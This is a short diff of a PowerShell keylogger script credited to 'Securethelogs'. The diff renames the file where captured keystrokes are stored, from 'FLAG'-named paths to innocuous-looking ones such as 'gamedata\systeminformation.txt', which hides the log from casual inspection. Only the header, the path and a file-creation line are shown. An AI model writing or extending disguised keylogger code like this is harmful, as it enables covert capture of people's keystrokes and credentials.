@@ -1,7 +1,7 @@
 # Creator: Securethelogs | @Securethelogs
 # Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
 
-$path = "C:\Windows\Temp\FLAG099\FLAG122.txt"
+$path = "C:\Windows\Temp\gamedata\systeminformation.txt"
 
 
 if ((Test-Path $path) -eq $false) {New-Item $path}
